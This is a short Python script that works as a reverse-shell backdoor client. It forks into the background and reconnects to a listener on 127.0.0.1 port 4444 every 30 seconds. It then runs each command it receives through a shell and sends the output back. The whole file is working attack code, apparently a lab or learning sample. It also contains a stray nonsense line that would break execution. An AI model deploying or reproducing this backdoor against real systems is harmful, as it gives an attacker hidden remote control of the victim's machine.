import os
import sys
import time

#run in background
if os.fork():
    sys.exit()
vjugvjgv

print("test")
import socket
import subprocess

connected = False
while not connected:
    try:
        client_socket = socket.socket()
        server_address = '127.0.0.1'
        server_port = 4444
        client_socket.connect((server_address, server_port))
        connected = True
    except:
        #print("[DEBUG] Connection failed, reconnecting in 30 sec...")
        time.sleep(30)

while True:
    received = client_socket.recv(1024)
    received = str(received,'utf-8')

    if received == "closeConnection":
        break

    proc = subprocess.Popen([received], stdout=subprocess.PIPE, shell=True, stderr=subprocess.STDOUT)
    (out, err) = proc.communicate()
    out = str(out, 'UTF-8')

    if out == "":
        client_socket.send(str.encode(" "))
#    print("[DEBUG] command to run: " + received + " output: " + out)
    message = str.encode(out)
    client_socket.send(message)

client_socket.close()
exit()